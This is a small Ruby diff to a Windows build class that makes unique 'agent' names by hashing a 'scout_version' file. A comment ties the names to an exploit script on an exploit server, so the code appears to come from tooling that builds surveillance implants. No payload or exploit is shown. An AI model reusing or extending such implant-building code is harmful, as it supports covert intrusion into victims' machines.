@@ -456,7 +456,7 @@ class BuildWindows < Build
     # make the name unique (used by the exploit script on exploit server)
     # only if a name is not provided ('agent' is the default)
     if @appname.eql? 'agent'
-      hash = Digest::SHA1.digest(File.read(path('version')) + info_scout[:name])
+      hash = Digest::SHA1.digest(File.read(path('scout_version')) + info_scout[:name])
       hash = hash.split('').keep_if {|x| x.ord > 128}.join[0..5].unpack('H*').first
       @appname += '_' + hash
     end
